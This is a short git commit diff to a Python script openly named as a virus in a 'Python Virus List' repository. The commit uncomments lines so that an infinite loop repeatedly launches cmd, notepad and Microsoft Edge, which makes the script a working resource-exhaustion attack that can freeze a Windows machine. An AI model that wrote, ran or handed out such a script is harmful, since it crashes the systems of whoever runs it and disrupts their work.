4518d6727894e0bcbd17d9e34b7a0c4f90131bfb
Palash Ahmed <49250151+palahsu@users.noreply.github.com>
2021-02-01 15:53:21 +0600

    Update pyvirus 3.py

--- Python Virus List/pyvirus 3.py
+++ Python Virus List/pyvirus 3.py
@@ -1,8 +1,10 @@
+#This script open multiple app randomly.
+
 import os
 
 while True:
-    #var = os.system('start cmd')
-    #var2 = os.system('start notepad')
+    var = os.system('start cmd')
+    var2 = os.system('start notepad')
     var3 = os.system('microsoftedge ')
     print ("var")
     print ("var2")
